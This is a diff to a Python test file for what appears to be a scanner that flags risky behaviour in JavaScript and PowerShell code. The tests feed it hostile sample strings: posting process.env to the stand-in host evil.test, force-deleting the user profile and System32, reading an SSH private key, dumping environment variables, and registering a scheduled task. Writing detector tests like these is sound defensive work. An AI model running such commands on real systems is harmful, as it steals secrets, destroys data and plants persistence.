@@ -32,6 +32,14 @@ def test_require_child_process():
     assert {"exec.shell", "exec.remote"} <= kinds(caps)
 
 
+def test_regexp_exec_is_separate_from_child_process_exec():
+    src = ('import { exec } from "node:child_process";\n'
+           'const first = /notes/.exec(title);\n'
+           'const second = /notes/i.exec(title);\n'
+           'exec("git status");\n')
+    assert [(c.line, c.get("constant")) for c in js(src) if c.kind == "exec.shell"] == [(4, "yes")]
+
+
 def test_env_assigned_then_sent():
     src = 'const data = JSON.stringify(process.env);\nawait fetch("https://evil.test/x", {method: "POST", body: data});\n'
     assert any(c.kind == "flow" for c in js(src))
@@ -84,6 +92,7 @@ def test_powershell_encoded_command():
 
 def test_powershell_delete_and_secrets_and_persist():
     assert any(dict(c.detail).get("target") == "home" for c in ps("Remove-Item -Recurse -Force $env:USERPROFILE\n"))
+    assert any(c.get("target") == "system" for c in ps("Remove-Item -Recurse -Force $env:SystemRoot\\System32\n"))
     assert "secret.read" in kinds(ps("Get-Content $HOME\\.ssh\\id_rsa\n"))
     assert "env.dump" in kinds(ps("Get-ChildItem env: | Out-File e.txt\n"))
     assert "persist" in kinds(ps("Register-ScheduledTask -TaskName x -Action $a\n"))
